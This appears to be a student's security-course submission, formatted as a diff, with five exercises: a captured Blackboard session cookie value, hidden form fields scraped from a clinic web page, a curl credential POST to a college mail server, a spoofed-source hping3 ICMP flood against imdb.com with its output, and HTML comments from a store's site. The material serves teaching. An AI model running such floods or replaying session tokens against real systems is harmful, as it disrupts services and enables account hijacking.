@@ -1,0 +1,66 @@
+Name: Patrick Parreno
+Student ID: 101085200
+
+1)
+Domain Information
+------------------
+https://bb-gbc.blackboard.com/webapps/portal/
+
+Cookie Information
+------------------
+Domain: https://bb-gbc.blackboard.com
+Name: JSESSONID
+Value: 155A724402B2F066AB342B0935B7AB07
+Path: /webapps/bb-social-learning-BBLEARN
+
+2)
+
+Domain Information
+------------------
+
+https://www.opencare.com/dentists/brampton-on/north-park-family-dental-care-24630726162c/
+
+Hidden Elements
+--------------
+1. <input type="hidden" name="_wpcf7" value="28015" />
+2. <input type="hidden" name="_wpcf7_version" value="5.0.1" />
+3. <input type="hidden" name="_wpcf7_locale" value="en_US" />
+4. <input type="hidden" name="_wpcf7_unit_tag" value="wpcf7-f28015-o2" />
+5. <input type='hidden' class='wpcf7-pum' value='{"closepopup":false,"closedelay":0,"openpopup":false,"openpopup_id":0}' 
+
+Form Method
+-----------
+Post
+
+3)
+
+Command Used
+------------
+curl -d "username=NewStudent&password=FakePassword123" -X POST https://mail.georgebrown.ca
+
+4) 
+
+Command Used
+------------
+hping3 -1 --flood -a 192.168.33.123 imdb.com
+
+Output
+-----
+HPING imdb.com (eth0 52.94.225.248): icmp mode set, 28 headers + 0 data bytes
+hping in flood mode, no replies will be shown
+^C
+--- imdb.com hping statistic ---
+1135689 packets transmitted, 0 packets received, 100% packet loss
+round-trip min/avg/max = 0.0/0.0/0.0 msround-trip min/avg/max = 0.0/0.0/0.0 ms
+
+5)
+Domain information
+------------------
+https://ca.octobersveryown.com/
+
+Comments
+--------
+1. <!-- /snippets/social-meta-tags.liquid -->
+2. <!-- /snippets/oldIE-js.liquid -->
+3. <!-- Facebook Pixel Code -->
+4. <!-- Start nav -->
